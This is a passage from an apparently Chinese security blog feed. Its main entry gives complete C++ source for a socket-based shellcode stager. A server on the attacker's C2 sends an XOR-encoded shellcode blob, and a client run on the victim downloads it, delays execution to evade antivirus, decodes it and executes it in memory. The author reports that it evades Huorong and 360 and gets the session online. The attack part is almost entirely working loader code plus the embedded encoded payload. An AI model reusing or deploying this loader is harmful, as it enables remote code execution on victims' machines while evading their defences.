href="https://blog.csdn.net/qq_41874930/article/details/107840269">dns与smb beacon详解与一种内网穿透方法的实践</a></p><p><a href="https://www.freebuf.com/articles/web/247287.html">内网渗透：不出网渗透技巧</a><a href="https://www.freebuf.com/articles/web/247287.html">https://www.freebuf.com/articles/web/247287.html</a>)</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>利用SOCKET分离shellcode</title>
    <link href="/2020/12/13/%E5%88%A9%E7%94%A8SOCKET%E5%88%86%E7%A6%BBshellcode/"/>
    <url>/2020/12/13/%E5%88%A9%E7%94%A8SOCKET%E5%88%86%E7%A6%BBshellcode/</url>
    
    <content type="html"><![CDATA[<h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>客户端运行后向服务端发起请求接收xor运算后的shellcode还原后执行，达到远程加载shellcode的目的，与stager的功能有些类似。</p><h2 id="服务端代码"><a href="#服务端代码" class="headerlink" title="服务端代码"></a>服务端代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> BUF_SIZE = <span class="number">1024</span>;</span><br><span class="line">WSADATA         wsd;            <span class="comment">//WSADATA变量</span></span><br><span class="line">SOCKET          sServer;        <span class="comment">//服务器套接字</span></span><br><span class="line">SOCKET          sClient;        <span class="comment">//客户端套接字</span></span><br><span class="line">SOCKADDR_IN     addrServ;;      <span class="comment">//服务器地址</span></span><br><span class="line"><span class="keyword">char</span>            buf[BUF_SIZE];  <span class="comment">//接收数据缓冲区</span></span><br><span class="line"><span class="keyword">char</span>sendBuf[] = <span class="string">&quot;\x6b\xdf\x14\x73\x67\x7f\x5f\x97\x97\x97\xd6\xc6\xd6\xc7\xc5\xc6\xc1\xdf\xa6\x45\xf2\xdf\x1c\xc5\xf7\xdf\x1c\xc5\x8f\xdf\x1c\xc5\xb7\xdf\x1c\xe5\xc7\xdf\x98\x20\xdd\xdd\xda\xa6\x5e\xdf\xa6\x57\x3b\xab\xf6\xeb\x95\xbb\xb7\xd6\x56\x5e\x9a\xd6\x96\x56\x75\x7a\xc5\xd6\xc6\xdf\x1c\xc5\xb7\x1c\xd5\xab\xdf\x96\x47\xf1\x16\xef\x8f\x9c\x95\xe2\xe5\x1c\x17\x1f\x97\x97\x97\xdf\x12\x57\xe3\xf0\xdf\x96\x47\xc7\x1c\xdf\x8f\xd3\x1c\xd7\xb7\xde\x96\x47\x74\xc1\xdf\x68\x5e\xd6\x1c\xa3\x1f\xdf\x96\x41\xda\xa6\x5e\xdf\xa6\x57\x3b\xd6\x56\x5e\x9a\xd6\x96\x56\xaf\x77\xe2\x66\xdb\x94\xdb\xb3\x9f\xd2\xae\x46\xe2\x4f\xcf\xd3\x1c\xd7\xb3\xde\x96\x47\xf1\xd6\x1c\x9b\xdf\xd3\x1c\xd7\x8b\xde\x96\x47\xd6\x1c\x93\x1f\xdf\x96\x47\xd6\xcf\xd6\xcf\xc9\xce\xcd\xd6\xcf\xd6\xce\xd6\xcd\xdf\x14\x7b\xb7\xd6\xc5\x68\x77\xcf\xd6\xce\xcd\xdf\x1c\x85\x7e\xd8\x68\x68\x68\xca\xfd\x97\xde\x29\xe0\xfe\xf9\xfe\xf9\xf2\xe3\x97\xd6\xc1\xde\x1e\x71\xdb\x1e\x66\xd6\x2d\xdb\xe0\xb1\x90\x68\x42\xdf\xa6\x5e\xdf\xa6\x45\xda\xa6\x57\xda\xa6\x5e\xd6\xc7\xd6\xc7\xd6\x2d\xad\xc1\xee\x30\x68\x42\x7c\xe4\xcd\xdf\x1e\x56\xd6\x2f\xc7\x97\x97\x97\xda\xa6\x5e\xd6\xc6\xd6\xc6\xfd\x94\xd6\xc6\xd6\x2d\xc0\x1e\x08\x51\x68\x42\x7c\xce\xcc\xdf\x1e\x56\xdf\xa6\x45\xde\x1e\x4f\xda\xa6\x5e\xc5\xff\x97\x95\xd7\x13\xc5\xc5\xd6\x2d\x7c\xc2\xb9\xac\x68\x42\xdf\x1e\x51\xdf\x14\x54\xc7\xfd\x9d\xc8\xdf\x1e\x66\xdf\x1e\x4d\xde\x50\x57\x68\x68\x68\x68\xda\xa6\x5e\xc5\xc5\xd6\x2d\xba\x91\x8f\xec\x68\x42\x12\x57\x98\x12\x0a\x96\x97\x97\xdf\x68\x58\x98\x13\x1b\x96\x97\x97\x7c\x44\x7e\x73\x96\x97\x97\x7f\x35\x68\x68\x68\xb8\xff\xd3\xd9\xf4\x97\x9b\x88\x75\x09\xbe\x35\xdc\xd7\x35\x98\xd0\x2d\xbe\xa9\x5b\x83\x00\xa1\xc6\x5a\xa4\x4c\xbd\xd2\x20\xcc\x66\x45\x97\x24\xda\x15\x40\x32\xe1\xb7\x8c\xa2\xfa\xa2\xa0\x20\x67\x69\x1c\x02\xe1\x54\x4e\x8a\x79\x2c\xf0\xa7\x4b\x7d\xd5\xb9\x3d\xee\x1a\x4a\xf5\xa7\x74\x8d\x66\xed\x9a\x43\xf5\x3f\x5a\x97\xc2\xe4\xf2\xe5\xba\xd6\xf0\xf2\xf9\xe3\xad\xb7\xda\xf8\xed\xfe\xfb\xfb\xf6\xb8\xa3\xb9\xa7\xb7\xbf\xf4\xf8\xfa\xe7\xf6\xe3\xfe\xf5\xfb\xf2\xac\xb7\xda\xc4\xde\xd2\xb7\xaf\xb9\xa7\xac\xb7\xc0\xfe\xf9\xf3\xf8\xe0\xe4\xb7\xd9\xc3\xb7\xa2\xb9\xa6\xac\xb7\xc3\xe5\xfe\xf3\xf2\xf9\xe3\xb8\xa3\xb9\xa7\xac\xb7\xb9\xd9\xd2\xc3\xb7\xd4\xdb\xc5\xb7\xa6\xb9\xa6\xb9\xa3\xa4\xa5\xa5\xac\xb7\xd5\xd8\xde\xd2\xaf\xac\xd2\xd9\xc2\xc4\xbe\x9a\x9d\x97\xba\x40\x2a\xb6\xce\x2c\x01\xae\x0c\x64\x70\x02\xfb\xbf\x3b\x14\x9d\x54\xb9\x76\xe2\x9c\x2a\x5d\x28\x08\x2f\xcd\x21\x52\x5c\x57\xe0\xfd\x14\x8a\x95\xaf\x66\xc1\x23\x70\x97\xe4\xb2\xd6\xf7\xd0\x3a\xf6\xf7\xcd\x87\x96\xb2\x0f\xef\x11\x6b\x1c\x22\x4d\xc4\xed\x65\xce\x0a\xab\x30\x94\xd2\xdc\x8d\xbf\x3a\xa6\xc9\xe0\x5e\x93\x89\x10\x47\xfa\x96\xac\xb7\x70\xdd\x93\x41\x7b\x62\x5d\x35\xe1\x35\x8b\x4a\x50\x07\x38\x1f\xb8\x10\x92\xe0\x08\xcb\xdb\x79\x8c\xbe\x94\xcb\xc0\xb2\x70\x70\xac\x36\xbd\x83\x76\x46\xde\xfc\x4a\xac\x0b\x30\x69\x57\x05\x69\xac\x1f\xec\xba\x09\x8f\x62\xe8\x4f\xcd\xe2\x35\x07\xbe\xab\xaf\x7c\x64\x8a\x01\xf5\x92\xe2\x9c\xda\x28\x7f\xd5\xc3\x0d\xa3\x8f\x8b\x97\x63\x34\xfa\x7e\xe9\xd7\x5e\x5b\x7b\xb5\xb3\x47\xa8\xe3\x8f\x37\xd0\x2a\x30\xb1\xc0\x32\xe8\xd9\x53\x97\xd6\x29\x67\x22\x35\xc1\x68\x42\xdf\xa6\x5e\x2d\x97\x97\xd7\x97\xd6\x2f\x97\x87\x97\x97\xd6\x2e\xd7\x97\x97\x97\xd6\x2d\xcf\x33\xc4\x72\x68\x42\xdf\x04\xc4\xc4\xdf\x1e\x70\xdf\x1e\x66\xdf\x1e\x4d\xd6\x2f\x97\xb7\x97\x97\xde\x1e\x6e\xd6\x2d\x85\x01\x1e\x75\x68\x42\xdf\x14\x53\xb7\x12\x57\xe3\x21\xf1\x1c\x90\xdf\x96\x54\x12\x57\xe2\x40\xcf\xcf\xcf\xdf\x92\x97\x97\x97\x97\xc7\x54\x7f\x08\x6a\x68\x68\xa6\xae\xa5\xb9\xa6\xa1\xaf\xb9\xa6\xa6\xa6\xb9\xa6\xa4\xa7\x97\x85\xa3\xc1\xef&quot;</span>;</span><br><span class="line"><span class="keyword">int</span>             retVal;         <span class="comment">//返回值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt;= <span class="number">1</span>) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;USAGE: server.exe &lt;Listen Port&gt;&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsd) != <span class="number">0</span>)<span class="comment">//初始化套结字动态库</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;WSAStartup failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建套接字</span></span><br><span class="line">sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sServer)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Socket Failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">WSACleanup();<span class="comment">//释放套接字资源;</span></span><br><span class="line"><span class="keyword">return</span>  <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//服务器套接字地址</span></span><br><span class="line">addrServ.sin_family = AF_INET;</span><br><span class="line">addrServ.sin_port = htons((<span class="keyword">short</span>)atoi(argv[<span class="number">1</span>]));;</span><br><span class="line">addrServ.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line"><span class="comment">//绑定套接字</span></span><br><span class="line">retVal = bind(sServer, (LPSOCKADDR)&amp;addrServ, <span class="keyword">sizeof</span>(SOCKADDR_IN));</span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == retVal)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Bind Failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">closesocket(sServer);   <span class="comment">//关闭套接字</span></span><br><span class="line">WSACleanup();           <span class="comment">//释放套接字资源;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//开始监听 </span></span><br><span class="line">retVal = listen(sServer, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == retVal)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Listen Failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">closesocket(sServer);   <span class="comment">//关闭套接字</span></span><br><span class="line">WSACleanup();           <span class="comment">//释放套接字资源;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;开始监听中....&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//接受客户端请求</span></span><br><span class="line">sockaddr_in addrClient;</span><br><span class="line"><span class="keyword">int</span> addrClientlen = <span class="keyword">sizeof</span>(addrClient);</span><br><span class="line">sClient = accept(sServer, (sockaddr FAR*) &amp; addrClient, &amp;addrClientlen); <span class="comment">// 生成对应当前客户端连接的套接字sClient</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sClient)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Accept Failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">closesocket(sServer);   <span class="comment">//关闭套接字</span></span><br><span class="line">WSACleanup();           <span class="comment">//释放套接字资源;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> flag = <span class="number">1</span>; <span class="comment">//只接收一次</span></span><br><span class="line"><span class="keyword">while</span> (flag)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//接收客户端数据</span></span><br><span class="line">ZeroMemory(buf, BUF_SIZE); <span class="comment">// 填充为0 防止内存分配发生意外</span></span><br><span class="line"></span><br><span class="line">retVal = recv(sClient, buf, BUF_SIZE, <span class="number">0</span>); <span class="comment">// 接收数据放在buf缓冲区</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == retVal) <span class="comment">//判断是否接收错误</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Recv Failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">closesocket(sServer);   <span class="comment">//关闭套接字</span></span><br><span class="line">closesocket(sClient);   <span class="comment">//关闭套接字     </span></span><br><span class="line">WSACleanup();           <span class="comment">//释放套接字资源;</span></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (buf[<span class="number">0</span>] == <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;成功建立通信&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">send(sClient, sendBuf, <span class="keyword">sizeof</span>(sendBuf), <span class="number">0</span>);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;向客户端发送shellcode...&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;发送shellcode成功!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">flag = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//退出</span></span><br><span class="line">closesocket(sServer);   <span class="comment">//关闭套接字</span></span><br><span class="line">closesocket(sClient);   <span class="comment">//关闭套接字</span></span><br><span class="line">WSACleanup();           <span class="comment">//释放套接字资源;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;WinSock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;ws2_32.lib&quot;</span>)  <span class="comment">//添加ws2_32动态库</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable:4996) <span class="comment">//忽略旧函数使用的警告</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> BUF_SIZE = <span class="number">1024</span>;</span><br><span class="line"></span><br><span class="line">WSADATAwsd; <span class="comment">//WSADATA变量</span></span><br><span class="line">SOCKETsHost; <span class="comment">// 服务器套接字socket</span></span><br><span class="line">SOCKADDR_INservAddr; <span class="comment">//服务器地址</span></span><br><span class="line"><span class="keyword">char</span>buf[BUF_SIZE]; <span class="comment">// 存放发送的数据缓冲区</span></span><br><span class="line"><span class="keyword">char</span>bufRecv[BUF_SIZE]; <span class="comment">//接收收到的数据缓冲区</span></span><br><span class="line">DWORDdwThreadId;</span><br><span class="line">HANDLEhThread;</span><br><span class="line">DWORDdwOldProtect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> retVal; <span class="comment">// 返回值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc &lt;= <span class="number">2</span>) &#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;USAGE: client.exe &lt;Server IP&gt; &lt;Server PORT&gt;&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsd) != <span class="number">0</span>) <span class="comment">//初始化套结字动态库</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;WSAStartup failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">sHost = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>); <span class="comment">//创建套接字 IPV4  可靠的，双向的类型服务提供商选择</span></span><br><span class="line"><span class="keyword">if</span> (INVALID_SOCKET == sHost)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;socket failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">WSACleanup();</span><br><span class="line"><span class="keyword">return</span>  <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//设置服务器的地址</span></span><br><span class="line">servAddr.sin_family = AF_INET; <span class="comment">//指定IPV4</span></span><br><span class="line">servAddr.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]); <span class="comment">// 指定服务器的地址</span></span><br><span class="line">servAddr.sin_port = htons((<span class="keyword">short</span>)atoi(argv[<span class="number">2</span>])); <span class="comment">// 指定服务器的端口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">retVal = connect(sHost, (LPSOCKADDR)&amp;servAddr, <span class="keyword">sizeof</span>(servAddr)); <span class="comment">// 套接字 sockaddr的指针，也就是地址 第三个参数为SOCKADDR_IN结构体的大小</span></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == retVal) <span class="comment">//判断是否连接成功</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;connect failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">closesocket(sHost);</span><br><span class="line">WSACleanup();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">ZeroMemory(buf, BUF_SIZE); <span class="comment">// buf指向的地址用0来填充</span></span><br><span class="line"><span class="built_in">strcpy</span>(buf, <span class="string">&quot;ok&quot;</span>); <span class="comment">//给ok两个字节的字符串复制给buf区段</span></span><br><span class="line"></span><br><span class="line">retVal = send(sHost, buf, <span class="built_in">strlen</span>(buf), <span class="number">0</span>); <span class="comment">//send的返回值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (SOCKET_ERROR == retVal) <span class="comment">//判断是否发送成功</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;send failed!&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">closesocket(sHost);</span><br><span class="line">WSACleanup();</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Starting Download Payload&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">ZeroMemory(bufRecv, BUF_SIZE); <span class="comment">// bufRevc指向的地址用0来填充</span></span><br><span class="line">Sleep(<span class="number">2000</span>); <span class="comment">//延迟两秒起到免杀绕过的效果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">recv(sHost, bufRecv, BUF_SIZE, <span class="number">0</span>); <span class="comment">//bufRecv缓冲区接收 服务端发送来的数据</span></span><br><span class="line"></span><br><span class="line">Sleep(<span class="number">4000</span>);</span><br><span class="line">closesocket(sHost);</span><br><span class="line">WSACleanup();</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(bufRecv); i++) &#123; <span class="comment">//采取倾旋的方式来进行异或解密</span></span><br><span class="line"><span class="comment">//Sleep(50);</span></span><br><span class="line">_InterlockedXor8(bufRecv + i, <span class="number">0x97</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;加载shellcode中&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//下面就是开辟内存存储shellcode 创建线程进行执行</span></span><br><span class="line"><span class="keyword">char</span>* shellcode = (<span class="keyword">char</span>*)VirtualAlloc(</span><br><span class="line"><span class="literal">NULL</span>,</span><br><span class="line">BUF_SIZE,</span><br><span class="line">MEM_COMMIT,</span><br><span class="line">PAGE_READWRITE <span class="comment">// 只申请可读可写</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">CopyMemory(shellcode, bufRecv, BUF_SIZE);</span><br><span class="line">VirtualProtect(shellcode, BUF_SIZE, PAGE_EXECUTE, &amp;dwOldProtect); <span class="comment">// VirtualProtect改变它的属性 -&gt; 可执行</span></span><br><span class="line"></span><br><span class="line">hThread = CreateThread(</span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 安全描述符</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 栈的大小</span></span><br><span class="line">(LPTHREAD_START_ROUTINE)shellcode, <span class="comment">// 函数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 参数</span></span><br><span class="line"><span class="literal">NULL</span>, <span class="comment">// 线程标志</span></span><br><span class="line">&amp;dwThreadId <span class="comment">// 线程ID</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在c2上运行服务端</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/4f8be20b-8018-418a-89f9-cf48d4f24798.PNG" alt="imgbed.cn图床"></a></p><p>在目标机器上执行客户端文件,联网情况下火绒和360不查杀</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/6dd0da7e-effb-4afa-b0ab-c5a7a5483302.PNG" alt="imgbed.cn图床"></a></p><p>成功上线</p><p><a href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/ffa22ff5-65bd-489f-a3af-365d2939d8d9.png" alt="imgbed.cn图床"></a></p><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="https://www.cnblogs.com/zpchcbd/p/12170851.html">https://www.cnblogs.com/zpchcbd/p/12170851.html</a></p><p><a href="https://payloads.online/archivers/2019-11-10/5">https://payloads.online/archivers/2019-11-10/5</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DLL代理加载shellcode实践</title>
    <link href="/2020/12/06/DLL%E4%BB%A3%E7%90%86%E5%8A%A0%E8%BD%BDshellcode%E5%AE%9E%E8%B7%B5/"/>
